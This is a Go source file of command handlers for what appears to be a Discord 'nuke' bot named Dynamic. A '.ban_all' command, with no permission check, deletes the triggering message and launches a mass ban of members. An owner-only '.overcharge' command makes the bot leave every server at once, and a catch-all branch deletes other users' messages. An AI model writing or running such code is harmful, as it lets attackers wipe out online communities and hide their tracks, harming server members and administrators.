package commands

import (
	"Dynamic/core/removing"
	"Dynamic/core/requests"
	"Dynamic/core/start_end"
	"os"
	"sync"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func Leave(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == ".leave" {
		s.ChannelMessageDelete(m.ChannelID, m.ID)
		start_end.Leave(s, m)
	}
}

func BanAll(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == ".ban_all" {
		s.ChannelMessageDelete(m.ChannelID, m.ID)
		wg.Add(1)
		go func() {
			defer wg.Done()
			removing.MemberBan(s, m)
		}()
		wg.Wait()
	}
}

func LeaveEveryServer(s *discordgo.Session, m *discordgo.MessageCreate) {
	godotenv.Load()
	BOT_OWNER_ID := os.Getenv("BOT_OWNER_ID")

	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == ".overcharge" && m.Author.ID == BOT_OWNER_ID {
		s.ChannelMessageDelete(m.ChannelID, m.ID)

		guilds := s.State.Guilds
		smoothed := requests.Smooth(guilds)

		for _, ch := range smoothed {
			wg := new(sync.WaitGroup)
			wg.Add(len(ch))
			for _, guild := range ch {
				go func(guild *discordgo.Guild) {
					defer wg.Done()
					s.GuildLeave(guild.ID)
				}(guild)
			}
			wg.Wait()
		}
	} else {
		s.ChannelMessageDelete(m.ChannelID, m.ID)
	}
}
